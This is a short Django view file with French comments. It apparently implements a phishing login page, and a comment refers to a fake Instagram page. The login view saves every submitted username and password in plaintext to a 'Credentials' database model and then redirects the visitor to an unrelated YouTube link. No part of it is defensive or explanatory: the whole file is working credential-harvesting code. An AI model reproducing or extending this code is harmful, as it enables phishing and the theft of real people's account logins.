from django.shortcuts import render, redirect
from .forms import LoginForm
from .models import Credentials

# Create your views here.

def login_view(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Enregistrez les identifiants dans la base de données
            Credentials.objects.create(nom_utilisateur=username, mot_de_passe=password)

            # Redirigez vers une page de confirmation (ou une fausse page Instagram)
            return redirect('https://youtu.be/XF1FJ-nptyc?si=0zM8PQhTI6wiB0lS')
    else:
        form = LoginForm()
    return render(request, 'login.html', {'form': form})